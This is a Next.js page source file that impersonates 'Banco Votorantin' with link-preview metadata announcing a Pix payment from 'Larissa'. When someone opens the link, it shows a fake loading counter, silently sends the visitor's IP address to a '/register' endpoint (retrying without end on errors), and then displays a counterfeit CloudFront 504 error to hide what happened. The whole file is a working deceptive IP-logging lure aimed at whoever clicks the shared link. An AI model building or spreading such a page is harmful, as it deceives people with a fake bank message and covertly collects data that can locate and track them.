import Head from "next/head";
import axios from "axios";
import { useCallback, useEffect, useState } from "react";
import CountUp from "react-countup";
import img from "../public/jornalismo.jpeg";
import api from "./api";

export default function Home({ ip }) {
  const [loading, setLoading] = useState(true);
  const [counter, setCounter] = useState(0);
  const handleSubmit = useCallback(async () => {
    try {
      await new Promise((resolve) => setTimeout(resolve, 2000));
      const response = await api.post("/register", { ipAddress: ip });
      setLoading(false);
      console.log(response);
    } catch (error) {
      handleSubmit();
      console.log(error);
    }
  }, [ip]);

  useEffect(() => {
    setLoading(true);

    api.get("/");
    new Promise((resolve) => setTimeout(resolve, 2000)).then(() =>
      api
        .get("/")
        .then((response) => handleSubmit())
        .catch((error) => handleSubmit())
    );
  }, [handleSubmit]);

  const currentURL = "http://fofocando.vercel.com.br";
  const previewImage =
    "https://www.tupi.fm/wp-content/uploads/2019/08/rep√≥rter-300x140.png";
  const siteName = "Banco Votorantin";
  const pageTitle = "Comprovante Pix no valor...";
  const description =
    "Eiii, Larissa acaba de te enviar um pix";

  return (
    <div>
      <Head>
        <title>Banco Votorantin</title>
        <link rel="icon" href="/favicon.ico" />
        <meta property="og:url" content={currentURL} key="ogurl" />
        <meta property="og:image" content={previewImage} key="ogimage" />
        <meta property="og:site_name" content={siteName} key="ogsitename" />
        <meta property="og:title" content={pageTitle} key="ogtitle" />
        <meta property="og:description" content={description} key="ogdesc" />
      </Head>

      <main>
        {loading && (
          <>
            <div className="loading-page">
              <div className="counter">
                <p>Carregando</p>
                <h1>
                  <CountUp end={100} duration={5} />%
                </h1>
                <hr />
              </div>
            </div>
          </>
        )}
        {!loading && (
          <>
            <h1>504 ERROR</h1>
            <h2>The request could not be satisfied.</h2>
            <hr />
            CloudFront attempted to establish a connection with the origin, but
            either the attempt failed or the origin c losed the connection. We
            can t connect to the server for this app or website at this time.
            There might be too much traffic or a con figuration error. Try again
            later, or contact the app or website owner.
            <br />
            If you provide content to customers through CloudFront, you can find
            steps to troubleshoot and help prevent t his error by reviewing the
            CloudFront documentation.
            <br />
            <hr />
            <pre>
              Generated by cloudfront (CloudFront) Request ID:
              mOWF1EirGoYtvHZecl30gRxV8BH795HPffePtmHnRZNMIupEorzMJw==
            </pre>
            <address></address>
          </>
        )}
      </main>
    </div>
  );
}

Home.getInitialProps = async ({ req }) => {
  const ip = req.headers["x-real-ip"] || req.connection.remoteAddress;
  return { ip };
};
